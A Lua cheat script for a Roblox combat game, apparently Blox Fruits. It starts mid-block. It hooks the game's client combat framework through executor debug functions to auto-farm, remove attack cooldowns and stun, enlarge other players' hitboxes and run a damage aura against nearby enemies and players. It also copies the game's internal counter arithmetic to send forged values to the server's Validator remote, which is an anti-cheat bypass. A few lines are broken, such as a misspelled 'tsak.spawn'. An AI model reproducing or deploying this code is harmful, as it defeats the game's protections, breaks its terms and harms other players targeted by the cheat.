        
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
            end
            end)
        end
            end)
    

            
            spawn(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                pcall(function()
                    if _G.Auto_Buso then
                if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
                local args = {
                [1] = "Buso"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end
            end
            end)
            end)
            end)
        
spawn(function()
            while wait(.5) do
                pcall(function()
                    if _G.Fast_Farm then
                        if game:GetService("Players").LocalPlayer.Data.Level.Value >= 60 and game:GetService("Players").LocalPlayer.Data.Level.Value <= 80 then
local args = {
    [1] = "EnablePvp"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
                    end
                end)
end
end)


            spawn(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                pcall(function()
                    if _G.Fast_Farm then
                        if game:GetService("Players").LocalPlayer.Data.Level.Value >= 60 and game:GetService("Players").LocalPlayer.Data.Level.Value <= 80 then
                            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v.ToolTip == _G.SelectWeapon then
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(v.Name))
                                end
                                end
                    end
                    end
                end)
end)
end)    




            spawn(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                pcall(function()
                    if _G.Fast_Farm then
                        for i,v in pairs(game.Players:GetChildren()) do
                            if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false and game:GetService("Players").LocalPlayer.Data.Level.Value > 80 then
                                _G.Auto_Farm = true
                            elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true and string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Gorillas") and game:GetService("Players").LocalPlayer.Data.Level.Value >= 60 then
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest");
                            elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false and game:GetService("Players").LocalPlayer.Data.Level.Value >= 60 then
                                _G.Auto_Farm = false
                                wait(1)
local args = {
                                        [1] = "PlayerHunter"
                                    }

                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                        elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true and string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, v.Name) then
    v.Character.HumanoidRootPart.CanCollide = false
    v.Character.HumanoidRootPart.Size = Vector3.new(120,120,120)
                    totarget(v.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,7))
            local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework)
            local Camera = require(game.ReplicatedStorage.Util.CameraShaker)
            Camera:Stop()
            getupvalues(CombatFramework)[2].activeController.hitboxMagnitude = 80
getupvalues(CombatFramework)[2]['activeController']:attack()  
end
                        end
                end
                
        end)
            end)
            end)
            
            spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.Fast_Farm then
if game:GetService("Players").LocalPlayer.Data.Level.Value > 60 and game:GetService("Players").LocalPlayer.Data.Level.Value < 80 then
for i,v in pairs(game.Players:GetChildren()) do
    if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true and string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, v.Name) then
        if v.Data.Level.Value < 20 or v.Data.Level.Value > 150 then
local args = {
    [1] = "PlayerHunter"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
    end
    end
                    end
                end)
end
end)   
                
        spawn(function()
        game:GetService("RunService").RenderStepped:Connect(function()
            pcall(function()
                if _G.Auto_Farm then
                    CheckLevel()    
        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            for i2,v2 in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == Mon and v2.Name == Mon then
                                    local Distance2 = (v.HumanoidRootPart.Position - v2.HumanoidRootPart.Position).Magnitude
                                    if Distance2 <= 150 then    
                                    v2.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame
                                    v2.HumanoidRootPart.CanCollide = false
                                    v.Humanoid:ChangeState(11)
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                            end
    end
                    
                            end
            end)
        end)
        end)
        
        spawn(function()
        game:GetService("RunService").RenderStepped:Connect(function()
            pcall(function()
                if _G.Auto_Farm then
                    CheckLevel()
                if game:GetService("Workspace").Enemies[Mon].Humanoid.Health == 0 then
    game:GetService("Workspace").Enemies[Mon]:Destroy()
    end
    end
    end)
    end)
        end)
        
                local plr = game.Players.LocalPlayer

local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
local CbFw2 = CbFw[2]

function GetCurrentBlade() 
    local p13 = CbFw2.activeController
    local ret = p13.blades[1]
    if not ret then return end
    while ret.Parent ~= game.Players.LocalPlayer.Character do ret=ret.Parent end
    return ret
end

_G.A_SzFastAttackDelay = 0.05

local CameraShaker = require(game.ReplicatedStorage.Util.CameraShaker)
CombatFrameworkR = require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework)
y = debug.getupvalues(CombatFrameworkR)[2]
spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
        if _G.A_SzFastAttack then
            if typeof(y) == "table" then
                pcall(function()
                    CameraShaker:Stop()
                    y.activeController.timeToNextAttack = (math.huge^math.huge^math.huge)
                    y.activeController.timeToNextAttack = 0
                    y.activeController.hitboxMagnitude = 60
                    y.activeController.active = false
                    y.activeController.timeToNextBlock = 0
                    y.activeController.focusStart = 1655503339.0980349
                    y.activeController.increment = 1
                    y.activeController.blocking = false
                    y.activeController.attacking = false
                    y.activeController.humanoid.AutoRotate = true
                end)
            end
        end
    end)
end)
spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
        if _G.A_SzFastAttack or _G.A_SzFastAttackCambodiakak == true then
            game.Players.LocalPlayer.Character.Stun.Value = 0
            game.Players.LocalPlayer.Character.Busy.Value = false        
        end
    end)
end)
local CamShake = require(game.ReplicatedStorage.Util.CameraShaker)
CamShake:Stop()
local Client = game.Players.LocalPlayer
local STOP = require(Client.PlayerScripts.CombatFramework.Particle)
local STOPRL = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
spawn(function()
    while task.wait() do
        pcall(function()
            if not shared.orl then shared.orl = STOPRL.wrapAttackAnimationAsync end
            if not shared.cpc then shared.cpc = STOP.play end
                STOPRL.wrapAttackAnimationAsync = function(a,b,c,d,func)
                local Hits = STOPRL.getBladeHits(b,c,d)
                if Hits then
                    if _G.A_SzFastAttack then
                        STOP.play = function() end
                        a:Play(0.01,0.01,0.01)
                        func(Hits)
                        STOP.play = shared.cpc
                        wait(a.length * 0.5)
                        a:Stop()
                    else
                        a:Play()
                    end
                end
            end
        end)
    end
end)
spawn(function()
    while wait(.1) do
        if _G.A_SzFastAttack then
            pcall(function()
                repeat task.wait(_G.A_SzFastAttackDelay)
                    AttackHit()
                until not _G.A_SzFastAttack
            end)
        end
    end
end)
function EquipAllWeapon()
	pcall(function()
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA('Tool') and not (v.Name == "Summon Sea Beast" or v.Name == "Water Body" or v.Name == "Awakening") then
				local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name) 
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(ToolHumanoid) 
                wait(1)
			end
		end
	end)
end
function AttackHit()
    local CombatFrameworkLib = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework))
    local CmrFwLib = CombatFrameworkLib[2]
    local plr = game.Players.LocalPlayer
    for i = 1, 1 do
        local bladehit = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(plr.Character,{plr.Character.HumanoidRootPart},60)
        local cac = {}
        local hash = {}
        for k, v in pairs(bladehit) do
            if v.Parent:FindFirstChild("HumanoidRootPart") and not hash[v.Parent] then
                table.insert(cac, v.Parent.HumanoidRootPart)
                hash[v.Parent] = true
            end
        end
        bladehit = cac
        if #bladehit > 0 then
            pcall(function()
                CmrFwLib.activeController.timeToNextAttack = 0
                CmrFwLib.activeController.attacking = false
                CmrFwLib.activeController.blocking = false
                CmrFwLib.activeController.timeToNextBlock = 0
                CmrFwLib.activeController.increment = 3
                CmrFwLib.activeController.hitboxMagnitude = 60
                CmrFwLib.activeController.focusStart = 0
                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(GetBladeHit()))
                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, i, "")
            end)
        end
    end
end
function GetBladeHit()
    local CombatFrameworkLib = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework))
    local CmrFwLib = CombatFrameworkLib[2]
    local p13 = CmrFwLib.activeController
    local weapon = p13.blades[1]
    if not weapon then 
        return weapon
    end
    while weapon.Parent ~= game.Players.LocalPlayer.Character do
        weapon = weapon.Parent 
    end
    return weapon
end
spawn(function()
    while task.wait(0.1) do
        if _G.FastAttackExtra then
            pcall(function()
                local AC = CbFw2.activeController
                for i = 1,1 do 
                    local bladehit = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
                        plr.Character,
                        {plr.Character.HumanoidRootPart},
                        60
                    )
                    local cac = {}
                    local hash = {}
                    for k, v in pairs(bladehit) do
                        if v.Parent:FindFirstChild("HumanoidRootPart") and not hash[v.Parent] then
                            table.insert(cac, v.Parent.HumanoidRootPart)
                            hash[v.Parent] = true
                        end
                    end
                    bladehit = cac
                    if #bladehit > 0 then
                        local u8 = debug.getupvalue(AC.attack, 5)
                        local u9 = debug.getupvalue(AC.attack, 6)
                        local u7 = debug.getupvalue(AC.attack, 4)
                        local u10 = debug.getupvalue(AC.attack, 7)
                        local u12 = (u8 * 798405 + u7 * 727595) % u9
                        local u13 = u7 * 798405
                        (function()
                            u12 = (u12 * u9 + u13) % 1099511627776
                            u8 = math.floor(u12 / u9)
                            u7 = u12 - u8 * u9
                        end)()
                        u10 = u10 + 1
                        debug.setupvalue(AC.attack, 5, u8)
                        debug.setupvalue(AC.attack, 6, u9)
                        debug.setupvalue(AC.attack, 4, u7)
                        debug.setupvalue(AC.attack, 7, u10)
                        if plr.Character:FindFirstChildOfClass("Tool") and AC.blades and AC.blades[1] then 
                            game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(GetCurrentBlade()))
                            game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(u12 / 1099511627776 * 16777215), u10)
                            game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, i, "") 
                        end
                    end
                end
            end)
        end
    end
end)
local SeraphFrame = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework")))[2]
local VirtualUser = game:GetService('VirtualUser')
local RigControllerR = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework.RigController))[2]
local Client = game:GetService("Players").LocalPlayer
local DMG = require(Client.PlayerScripts.CombatFramework.Particle.Damage)

function SeraphFuckWeapon() 
    local p13 = SeraphFrame.activeController
    local wea = p13.blades[1]
    if not wea then return end
    while wea.Parent~=game.Players.LocalPlayer.Character do wea=wea.Parent end
    return wea
end

function getHits(Size)
    local Hits = {}
    local Enemies = workspace.Enemies:GetChildren()
    local Characters = workspace.Characters:GetChildren()
    for i=1,#Enemies do local v = Enemies[i]
        local Human = v:FindFirstChildOfClass("Humanoid")
        if Human and Human.RootPart and Human.Health > 0 and game.Players.LocalPlayer:DistanceFromCharacter(Human.RootPart.Position) < Size+5 then
            table.insert(Hits,Human.RootPart)
        end
    end
    for i=1,#Characters do local v = Characters[i]
        if v ~= game.Players.LocalPlayer.Character then
            local Human = v:FindFirstChildOfClass("Humanoid")
            if Human and Human.RootPart and Human.Health > 0 and game.Players.LocalPlayer:DistanceFromCharacter(Human.RootPart.Position) < Size+5 then
                table.insert(Hits,Human.RootPart)
            end
        end
    end
    return Hits
end

function Boost()
    spawn(function()
    game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(SeraphFuckWeapon()))
    end)
end

function Unboost()
    spawn(function()
        game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("unequipWeapon",tostring(SeraphFuckWeapon()))
    end)
end

local cdnormal = 0
local Animation = Instance.new("Animation")
local CooldownFastAttack = 0
Attack = function()
    local ac = SeraphFrame.activeController
    if ac and ac.equipped then
        task.spawn(
            function()
            if tick() - cdnormal > 0.5 then
                ac:attack()
                cdnormal = tick()
            else
                -- Animation.AnimationId = ac.anims.basic[2]
                -- ac.humanoid:LoadAnimation(Animation):Play(1, 1)
                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", getHits(120), 2, "")
            end
        end)
    end
end

b = tick()
spawn(function()
    while wait(.2) do
        if  _G.FastAttackNormalSpeed then
            if b - tick() > 0.75 then
                wait(.2)
                b = tick()
            end
            pcall(function()
                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Humanoid.Health > 0 then
                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 60.9 then
                            Attack()
                            wait(.2)
                            Boost()
                        end
                    end
                end
            end)
        end
    end
end)

k = tick()
spawn(function()
    while wait(0.059) do
        if  _G.FastAttackNormalSpeed then
            if k - tick() > 0.75 then
                wait(0)
                k = tick()
            end
            pcall(function()
                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Humanoid.Health > 0 then
                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 60.9 then
                        wait(.2)
                        Unboost()
                        end
                    end
                end
            end)
        end
    end
end)

tjw1 = true
task.spawn(
    function()
        local a = game.Players.LocalPlayer
        local b = require(a.PlayerScripts.CombatFramework.Particle)
        local c = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
        if not shared.orl then
            shared.orl = c.wrapAttackAnimationAsync
        end
        if not shared.cpc then
            shared.cpc = b.play
        end
        if tjw1 then
            pcall(
                function()
                    c.wrapAttackAnimationAsync = function(d, e, f, g, h)
                        local i = c.getBladeHits(e, f, g)
                        if i then
                            b.play = function()
                            end
                            d:Play(1.25, 1.25, 1.25)
                            h(i)
                            b.play = shared.cpc
                            wait(.5)
                            d:Stop()
                        end
                    end
                end
            )
        end
    end
)

local Client = game.Players.LocalPlayer
local STOP = require(Client.PlayerScripts.CombatFramework.Particle)
local STOPRL = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
task.spawn(function()
    pcall(function()
        if not shared.orl then
            shared.orl = STOPRL.wrapAttackAnimationAsync
        end
            if not shared.cpc then
                shared.cpc = STOP.play 
            end
        spawn(function()
            game:GetService("RunService").Stepped:Connect(function()
                STOPRL.wrapAttackAnimationAsync = function(a,b,c,d,func)
                    local Hits = STOPRL.getBladeHits(b,c,d)
                    if Hits then
                        if  _G.FastAttackNormalSpeed then
                            STOP.play = function() end
                            a:Play(2.1,2.1,2.1)
                            func(Hits)
                            STOP.play = shared.cpc
                            wait(a.length * 0.5)
                            a:Stop()
                        else
                            func(Hits)
                            STOP.play = shared.cpc
                            wait(a.length * 0.5)
                            a:Stop()
                        end
                    end
                end
            end)
        end)
    end)
end)
local Client = game.Players.LocalPlayer
  local STOP = require(Client.PlayerScripts.CombatFramework.Particle)
  local STOPRL = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
  spawn(function()
  if not shared.orl then shared.orl = STOPRL.wrapAttackAnimationAsync end
  if not shared.cpc then shared.cpc = STOP.play end
  while task.wait() do
              STOPRL.wrapAttackAnimationAsync = function(a,b,c,d,func)
              local Hits = STOPRL.getBladeHits(b,c,d)
                  if Hits then
                      STOP.play = function() end
                      a:Play(0.01,0.01,0.01)
                      func(Hits)
                      STOP.play = shared.cpc
                      wait(a.length * 0.5)
                      a:Stop()
              end
          end
  end
  end)

local CurveFrame = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework")))[2]
local VirtualUser = game:GetService("VirtualUser")
local RigControllerR = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework.RigController))[2]
local Client = game:GetService("Players").LocalPlayer
local DMG = require(Client.PlayerScripts.CombatFramework.Particle.Damage)
local CameraShaker = require(game.ReplicatedStorage.Util.CameraShaker)
CameraShaker:Stop()
function CurveFuckWeapon()
    local p13 = CurveFrame.activeController
    local wea = p13.blades[1]
    if not wea then
        return
    end
    while wea.Parent ~= game.Players.LocalPlayer.Character do
        wea = wea.Parent
    end
    return wea
end

function getHits(Size)
    local Hits = {}
    local Enemies = workspace.Enemies:GetChildren()
    local Characters = workspace.Characters:GetChildren()
    for i = 1, #Enemies do
        local v = Enemies[i]
        local Human = v:FindFirstChildOfClass("Humanoid")
        if
            Human and Human.RootPart and Human.Health > 0 and
                game.Players.LocalPlayer:DistanceFromCharacter(Human.RootPart.Position) < Size + 5
         then
            table.insert(Hits, Human.RootPart)
        end
    end
    for i = 1, #Characters do
        local v = Characters[i]
        if v ~= game.Players.LocalPlayer.Character then
            local Human = v:FindFirstChildOfClass("Humanoid")
            if
                Human and Human.RootPart and Human.Health > 0 and
                    game.Players.LocalPlayer:DistanceFromCharacter(Human.RootPart.Position) < Size + 5
             then
                table.insert(Hits, Human.RootPart)
            end
        end
    end
    return Hits
end

function Boost()
    task.spawn(function()
    	game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(CurveFuckWeapon()))
    end)
end

function Unboost()
    tsak.spawn(function()
    	game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("unequipWeapon",tostring(CurveFuckWeapon()))
    end)
end

local cdnormal = 0
local Animation = Instance.new("Animation")
local CooldownFastAttack = 0

FastAttack = function()
    local ac = CurveFrame.activeController
    if ac and ac.equipped then
        task.spawn(function()
            if tick() - cdnormal > 0.5 then
                ac:attack()
                cdnormal = tick()
            else
                Animation.AnimationId = ac.anims.basic[2]
                ac.humanoid:LoadAnimation(Animation):Play(1, 1)
                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", getHits(120), 2, "")
            end
        end)
    end
end

bs = tick()
task.spawn(function()
	while task.wait(1) do
		if _G.FastAttackSpeed2 then
		    _G.Fast = true
			if bs - tick() > 0.75 then
				task.wait()
				bs = tick()
			end
			pcall(function()
				for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
					if v.Humanoid.Health > 0 then
						if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
							FastAttack()
							task.wait()
							Boost()
						end
					end
				end
			end)
		end
	end
end)

k = tick()
task.spawn(function()
    if _G.Fast then
    while task.wait(.2) do
            if k - tick() > 0.75 then
                task.wait()
                k = tick()
            end
            end
            pcall(function()
                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Humanoid.Health > 0 then
                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
                            task.wait(.000025)
                            Unboost()
                        end
                    end
                end
            end)
    end
end)

task.spawn(function()
    while task.wait() do
        if _G.Fast then
	   pcall(function()
		CurveFrame.activeController.timeToNextAttack = -1
		CurveFrame.activeController.focusStart = 0
		CurveFrame.activeController.hitboxMagnitude = 40
		CurveFrame.activeController.humanoid.AutoRotate = true
		CurveFrame.activeController.increment = 1 + 1 / 1
	   end)
    end
    end
end)

abc = true
task.spawn(function()
    local a = game.Players.LocalPlayer
    local b = require(a.PlayerScripts.CombatFramework.Particle)
    local c = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
    if not shared.orl then
        shared.orl = c.wrapAttackAnimationAsync
    end
    if not shared.cpc then
        shared.cpc = b.play
    end
    if abc then
        pcall(function()
            c.wrapAttackAnimationAsync = function(d, e, f, g, h)
            local i = c.getBladeHits(e, f, g)
            if i then
                b.play = function()
                end
                d:Play(0.25, 0.25, 0.25)
                h(i)
                b.play = shared.cpc
                wait(.5)
                d:Stop()
            end
            end
        end)
    end
end)

local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
local CombatFrameworkR = getupvalues(CombatFramework)[2]
local RigController = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
local RigControllerR = getupvalues(RigController)[2]

function CurrentWeapon()
	local ac = CombatFrameworkR.activeController
	local ret = ac.blades[1]
	if not ret then return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name end
	pcall(function()
		while ret.Parent~=game.Players.LocalPlayer.Character do ret=ret.Parent end
	end)
	if not ret then return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name end
	return ret
end

function getAllBladeHitsPlayers(Sizes)
	local Hits = {}
	local Client = game.Players.LocalPlayer
	local Characters = game:GetService("Workspace").Characters:GetChildren()
	for i=1,#Characters do local v = Characters[i]
		local Human = v:FindFirstChildOfClass("Humanoid")
		if v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
			table.insert(Hits,Human.RootPart)
		end
	end
	return Hits
end

function getAllBladeHits(Sizes)
	local Hits = {}
	local Client = game.Players.LocalPlayer
	local Enemies = game:GetService("Workspace").Enemies:GetChildren()
	for i=1,#Enemies do local v = Enemies[i]
		local Human = v:FindFirstChildOfClass("Humanoid")
		if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
			table.insert(Hits,Human.RootPart)
		end
	end
	return Hits
end

function DamageAura()
	local ac = CombatFrameworkR.activeController
	if ac and ac.equipped then
		for indexincrement = 1, 1 do
			local bladehit = getAllBladeHits(150) local a = getAllBladeHitsPlayers(150)
			if #bladehit or #a > 0 then
				local AcAttack8 = debug.getupvalue(ac.attack, 5)
				local AcAttack9 = debug.getupvalue(ac.attack, 6)
				local AcAttack7 = debug.getupvalue(ac.attack, 4)
				local AcAttack10 = debug.getupvalue(ac.attack, 7)
				local NumberAc12 = (AcAttack8 * 798405 + AcAttack7 * 727595) % AcAttack9
				local NumberAc13 = AcAttack7 * 798405
				(function()
					NumberAc12 = (NumberAc12 * AcAttack9 + NumberAc13) % 1099511627776
					AcAttack8 = math.floor(NumberAc12 / AcAttack9)
					AcAttack7 = NumberAc12 - AcAttack8 * AcAttack9
				end)()
				AcAttack10 = AcAttack10 + 1
				debug.setupvalue(ac.attack, 5, AcAttack8)
				debug.setupvalue(ac.attack, 6, AcAttack9)
				debug.setupvalue(ac.attack, 4, AcAttack7)
				debug.setupvalue(ac.attack, 7, AcAttack10)
				for k, v in pairs(ac.animator.anims.basic) do
					v:Play(0.01,0.01,0.01)
				end                 
				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and ac.blades[1] then 
					game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(CurrentWeapon()))
					game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(NumberAc12 / 1099511627776 * 16777215), AcAttack10)
                    game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, indexincrement, "") 
				end
			end
		end
	end
end

function AttackFunction()
	local ac = CombatFrameworkR.activeController
	if ac and ac.equipped then
		for indexincrement = 1, 1 do
			local bladehit = getAllBladeHits(60)
			if #bladehit > 0 then
				local AcAttack8 = debug.getupvalue(ac.attack, 5)
				local AcAttack9 = debug.getupvalue(ac.attack, 6)
				local AcAttack7 = debug.getupvalue(ac.attack, 4)
				local AcAttack10 = debug.getupvalue(ac.attack, 7)
				local NumberAc12 = (AcAttack8 * 798405 + AcAttack7 * 727595) % AcAttack9
				local NumberAc13 = AcAttack7 * 798405
				(function()
					NumberAc12 = (NumberAc12 * AcAttack9 + NumberAc13) % 1099511627776
					AcAttack8 = math.floor(NumberAc12 / AcAttack9)
					AcAttack7 = NumberAc12 - AcAttack8 * AcAttack9
				end)()
				AcAttack10 = AcAttack10 + 1 
				debug.setupvalue(ac.attack, 5, AcAttack8)
				debug.setupvalue(ac.attack, 6, AcAttack9)
				debug.setupvalue(ac.attack, 4, AcAttack7)
				debug.setupvalue(ac.attack, 7, AcAttack10)
				for k, v in pairs(ac.animator.anims.basic) do
					v:Play(0.01,0.01,0.01)
				end                 
				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and ac.blades[1] then 
					game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(CurrentWeapon()))
					game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(NumberAc12 / 1099511627776 * 16777215), AcAttack10)
                    game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, indexincrement, "")
				end
			end
		end
	end
end

task.spawn(function()
    pcall(function()
    while task.wait(_G.FastAttackSliderSet) do
        if _G.FastAttackSpeed2 then
            AttackFunction()
           end
        end
    end)
end)
